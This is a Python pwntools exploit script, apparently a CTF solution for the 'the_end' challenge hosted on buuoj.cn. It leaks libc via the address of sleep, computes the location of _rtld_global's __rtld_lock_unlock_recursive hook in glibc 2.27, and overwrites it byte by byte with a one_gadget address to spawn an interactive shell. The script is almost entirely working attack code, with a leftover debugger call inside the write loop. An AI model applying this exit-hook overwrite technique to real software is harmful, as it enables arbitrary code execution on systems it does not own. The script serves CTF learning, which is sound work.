# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './the_end'
os.system('chmod +x %s'%binary)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
libc = ELF('/home/niyah/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')
ld = ELF('/home/niyah/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-2.27.so')
DEBUG = 1
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '26962'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

one_gad = one_gadget(libc.path)

def attack():
    
    # _rtld_global

    ru('0x')
    sleep_addr = rint()

    libc.address = sleep_addr -libc.sym['sleep']
    ld.address = 0x3f1000 + libc.address
    ogg = 0x4f322 + libc.address
    _rtld_global = ld.sym['_rtld_global']
    __rtld_lock_unlock_recursive = _rtld_global+0xf08

    # 为啥本地和远程的栈结构会不同啊 真几把离谱

    ru('luck ;)')
    for i in range(5):
        se(p64(__rtld_lock_unlock_recursive + i))
        dbg()
        se(p64(ogg)[i])

    # exec 1>&0
    # lg('exit_hook',exit_hook)
    # dbg()

    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   the_end.py
@Time    :   2022/01/30 20:46:18
@Author  :   Niyah 
'''